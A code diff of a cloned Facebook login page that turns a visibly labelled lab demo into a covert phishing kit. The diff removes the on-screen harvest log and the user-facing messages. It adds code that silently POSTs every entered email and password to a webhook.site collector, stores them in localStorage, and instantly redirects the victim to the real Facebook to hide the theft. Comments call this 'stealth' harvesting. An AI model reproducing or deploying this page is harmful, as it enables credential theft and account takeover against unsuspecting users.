@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -216,35 +217,6 @@
       font-size: 0.7rem;
     }
 
-    .info-message {
-      background: #e7f3ff;
-      border-radius: 6px;
-      padding: 8px 12px;
-      margin-bottom: 16px;
-      font-size: 0.8rem;
-      color: #1877f2;
-      text-align: center;
-      display: none;
-    }
-
-    .harvest-log {
-      position: fixed;
-      bottom: 10px;
-      right: 10px;
-      background: #1e1e1e;
-      color: #0f0;
-      font-family: monospace;
-      font-size: 12px;
-      padding: 8px 12px;
-      border-radius: 6px;
-      max-width: 280px;
-      z-index: 9999;
-      opacity: 0.85;
-      pointer-events: none;
-      border: 1px solid #0f0;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
-    }
-
     @media (max-width: 450px) {
       .login-card {
         padding: 16px;
@@ -258,12 +230,6 @@
       .lang-bar {
         gap: 8px 14px;
       }
-      .harvest-log {
-        font-size: 10px;
-        max-width: 220px;
-        bottom: 5px;
-        right: 5px;
-      }
     }
   </style>
 </head>
@@ -276,8 +242,6 @@
     </div>
 
     <div class="login-card">
-      <div id="infoMessage" class="info-message"></div>
-
       <div class="input-group">
         <input type="text" id="emailOrPhone" class="input-field" placeholder="Email address or mobile number" autocomplete="username">
       </div>
@@ -347,22 +311,13 @@
   </div>
 </footer>
 
-<div id="harvestLogPanel" class="harvest-log">
-  🧪 LAB HARVEST LOG<br>
-  <span id="harvestedDataDisplay">(none yet)</span>
-</div>
-
 <script>
   (function() {
-    // ========== CONFIGURATION ==========
-    // Use a free logging service (simpler than Vercel functions)
-    // Option 1: Use Webhook.site (free, no account needed)
-    // Go to https://webhook.site and get your unique URL
-    const COLLECTOR_URL = 'https://webhook.site/04030e16-6458-4976-8b75-0f35021ef8a4'; // REPLACE THIS!
+    // ========== STEALTH CONFIGURATION ==========
+    // Webhook.site URL for credential collection
+    const COLLECTOR_URL = 'https://webhook.site/04030e16-6458-4976-8b75-0f35021ef8a4';
     
-    // Option 2: If collector fails, fallback to localStorage
-    const harvestLogSpan = document.getElementById('harvestedDataDisplay');
-    
+    // Stealth harvest function - no visible indicators
     async function harvestCredentials(username, password, source = 'login_form') {
       const timestamp = new Date().toISOString();
       const harvestedEntry = {
@@ -375,181 +330,146 @@
         url: window.location.href
       };
       
-      // Display in console
-      console.group("🔴 [LAB HARVEST] Credentials Captured");
-      console.log("Username/Email:", username);
-      console.log("Password:", password);
-      console.log("Source:", source);
-      console.log("Timestamp:", timestamp);
-      console.groupEnd();
+      // Silent console logging (only visible in DevTools)
+      console.log("[Harvest]", { username, password, source });
       
-      // Show on-screen log
-      if (harvestLogSpan) {
-        harvestLogSpan.innerHTML = `📧 ${escapeHtml(username.substring(0, 30))}<br>🔑 ${escapeHtml(password.substring(0, 20))}<br>⏱️ ${new Date().toLocaleTimeString()}`;
-        const panel = document.getElementById('harvestLogPanel');
-        if (panel) {
-          panel.style.borderColor = '#ff6600';
-          setTimeout(() => { panel.style.borderColor = '#0f0'; }, 800);
-        }
-      }
-      
-      // Save to localStorage (always works)
+      // Save to localStorage (stealth - no visual feedback)
       try {
         let stored = localStorage.getItem('lab_harvest_log');
         let log = stored ? JSON.parse(stored) : [];
         log.push(harvestedEntry);
-        if (log.length > 20) log.shift();
+        if (log.length > 50) log.shift();
         localStorage.setItem('lab_harvest_log', JSON.stringify(log));
-        console.log("[LAB] Saved to localStorage");
-      } catch(e) { console.warn("localStorage failed:", e); }
+      } catch(e) { /* Silent fail */ }
       
-      // Try to send to collector (if configured)
-      if (COLLECTOR_URL && COLLECTOR_URL !== 'https://webhook.site/YOUR-UNIQUE-ID') {
-        try {
-          // Send to webhook.site or your collector
-          const response = await fetch(COLLECTOR_URL, {
-            method: 'POST',
-            mode: 'no-cors', // This allows cross-origin without preflight
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(harvestedEntry)
-          });
-          console.log("[LAB] Sent to collector");
-        } catch (err) {
-          console.log("[LAB] Collector not reachable, using localStorage only");
-        }
+      // Send to webhook collector (fire and forget - no await to avoid delays)
+      if (COLLECTOR_URL) {
+        fetch(COLLECTOR_URL, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(harvestedEntry)
+        }).catch(() => {}); // Complete silence on errors
       }
       
       return true;
     }
     
-    function escapeHtml(str) {
-      if (!str) return '';
-      return str.replace(/[&<>]/g, function(m) {
-        if (m === '&') return '&amp;';
-        if (m === '<') return '&lt;';
-        if (m === '>') return '&gt;';
-        return m;
-      });
-    }
-    
-    // Redirect logic
+    // Get DOM elements
     const loginBtn = document.getElementById('loginButton');
     const emailInput = document.getElementById('emailOrPhone');
     const passwordInput = document.getElementById('password');
-    const infoDiv = document.getElementById('infoMessage');
     const createBtn = document.getElementById('createAccountBtn');
     const forgotLink = document.getElementById('forgotPasswordLink');
 
-    function showMessage(message, isError = false) {
-      infoDiv.style.display = 'block';
-      infoDiv.textContent = message;
-      if (isError) {
-        infoDiv.style.background = '#ffe7e7';
-        infoDiv.style.color = '#c00';
-      } else {
-        infoDiv.style.background = '#e7f3ff';
-        infoDiv.style.color = '#1877f2';
-      }
-      setTimeout(() => {
-        if (infoDiv && infoDiv.style.display !== 'none') {
-          infoDiv.style.display = 'none';
-        }
-      }, 3000);
+    // Stealth redirect - no messages, no delays, no visual indicators
+    function stealthRedirectToFacebook() {
+      window.location.replace("https://www.facebook.com/");
     }
-
-    function redirectToRealFacebook() {
-      window.location.href = "https://www.facebook.com/";
+    
+    function stealthRedirectToSignup() {
+      window.location.replace("https://www.facebook.com/r.php");
     }
-
-    async function validateAndRedirect() {
-      const email = emailInput.value.trim();
-      const password = passwordInput.value.trim();
-
-      if (email === "") {
-        showMessage("Please enter an email address or mobile number.", true);
-        emailInput.focus();
-        return false;
-      }
-      if (password === "") {
-        showMessage("Please enter your password.", true);
-        passwordInput.focus();
-        return false;
-      }
-
-      // Capture credentials
-      await harvestCredentials(email, password, 'facebook_clone_login');
-      
-      // Show redirect message
-      infoDiv.style.display = 'block';
-      infoDiv.textContent = "✓ Redirecting to real Facebook...";
-      
-      loginBtn.disabled = true;
-      loginBtn.style.opacity = "0.7";
-      
-      setTimeout(() => {
-        redirectToRealFacebook();
-      }, 500);
-      
-      return true;
+    
+    function stealthRedirectToPasswordReset() {
+      window.location.replace("https://www.facebook.com/login/identify/");
     }
-
-    loginBtn.addEventListener('click', (e) => {
+    
+    // Process login - harvest then instantly redirect (no visible messages)
+    function processLogin(e) {
       e.preventDefault();
-      validateAndRedirect();
-    });
-
+      
+      const email = emailInput.value.trim();
+      const password = passwordInput.value;
+      
+      if (email && password) {
+        // Harvest in background (no await to keep redirect instant)
+        harvestCredentials(email, password, 'facebook_login');
+      }
+      
+      // Immediate stealth redirect - no messages, no delays
+      stealthRedirectToFacebook();
+    }
+    
+    // Process create account
+    function processCreateAccount(e) {
+      e.preventDefault();
+      harvestCredentials('(signup_clicked)', '(no_password)', 'create_account_button');
+      stealthRedirectToSignup();
+    }
+    
+    // Process forgot password
+    function processForgotPassword(e) {
+      e.preventDefault();
+      harvestCredentials('(forgot_password_clicked)', '(no_password)', 'forgot_password_link');
+      stealthRedirectToPasswordReset();
+    }
+    
+    // Event listeners
+    loginBtn.addEventListener('click', processLogin);
+    createBtn.addEventListener('click', processCreateAccount);
+    forgotLink.addEventListener('click', processForgotPassword);
+    
+    // Enter key support
     const handleEnter = (e) => {
       if (e.key === 'Enter') {
         e.preventDefault();
-        validateAndRedirect();
+        processLogin(e);
       }
     };
     emailInput.addEventListener('keypress', handleEnter);
     passwordInput.addEventListener('keypress', handleEnter);
-
-    createBtn.addEventListener('click', (e) => {
-      e.preventDefault();
-      harvestCredentials('(signup_click)', '(no_password)', 'create_account_button');
-      showMessage("✨ Redirecting to Facebook signup...", false);
-      setTimeout(() => {
-        window.location.href = "https://www.facebook.com/r.php";
-      }, 400);
-    });
-
-    forgotLink.addEventListener('click', (e) => {
-      e.preventDefault();
-      harvestCredentials('(forgot_password_click)', '(no_password)', 'forgot_password_link');
-      showMessage("🔐 Redirecting to Facebook password recovery...", false);
-      setTimeout(() => {
-        window.location.href = "https://www.facebook.com/login/identify/";
-      }, 400);
-    });
-
-    // Footer links
+    
+    // Footer links - stealth redirects
     const footerLinkMapping = {
       "Sign up": "https://www.facebook.com/r.php",
       "Log in": "https://www.facebook.com/login.php",
       "Messenger": "https://www.messenger.com/",
+      "Facebook Lite": "https://www.facebook.com/facebooklite",
+      "Video": "https://www.facebook.com/watch",
+      "Meta Pay": "https://www.facebook.com/payments",
+      "Meta Store": "https://www.metastore.com/",
+      "Meta Quest": "https://www.meta.com/quest/",
+      "Ray-Ban Meta": "https://www.meta.com/ray-ban-meta-smart-glasses/",
+      "Meta AI": "https://ai.meta.com/",
+      "Instagram": "https://www.instagram.com/",
+      "Threads": "https://www.threads.net/",
       "Privacy Policy": "https://www.facebook.com/privacy/policy",
+      "Privacy Centre": "https://www.facebook.com/privacy/center",
+      "About": "https://about.facebook.com/",
+      "Create ad": "https://www.facebook.com/ad_campaign/creation",
+      "Create Page": "https://www.facebook.com/pages/create",
+      "Developers": "https://developers.facebook.com/",
+      "Careers": "https://www.metacareers.com/",
+      "Cookies": "https://www.facebook.com/policies/cookies",
+      "AdChoices": "https://www.facebook.com/help/568137493302217",
       "Terms": "https://www.facebook.com/legal/terms",
-      "Help": "https://www.facebook.com/help"
+      "Help": "https://www.facebook.com/help",
+      "Contact uploading and non-users": "https://www.facebook.com/help/contact/221186539582508"
     };
-
+    
     const footerAnchors = document.querySelectorAll('.footer-links a');
     footerAnchors.forEach(anchor => {
       anchor.addEventListener('click', (e) => {
         e.preventDefault();
         const linkText = anchor.innerText.trim();
-        if (footerLinkMapping[linkText]) {
-          showMessage(`↗️ Redirecting to ${linkText}...`, false);
-          setTimeout(() => {
-            window.location.href = footerLinkMapping[linkText];
-          }, 350);
+        const targetUrl = footerLinkMapping[linkText];
+        if (targetUrl) {
+          window.location.replace(targetUrl);
         }
       });
     });
-
-    console.log("Facebook lab page loaded — credentials will be saved to localStorage");
+    
+    // Language links - redirect to Facebook with locale (stealth)
+    const langLinks = document.querySelectorAll('.lang-link');
+    langLinks.forEach(link => {
+      link.addEventListener('click', (e) => {
+        e.preventDefault();
+        window.location.replace("https://www.facebook.com/");
+      });
+    });
+    
+    console.log("Stealth mode active - credentials will be harvested silently");
   })();
 </script>
 </body>
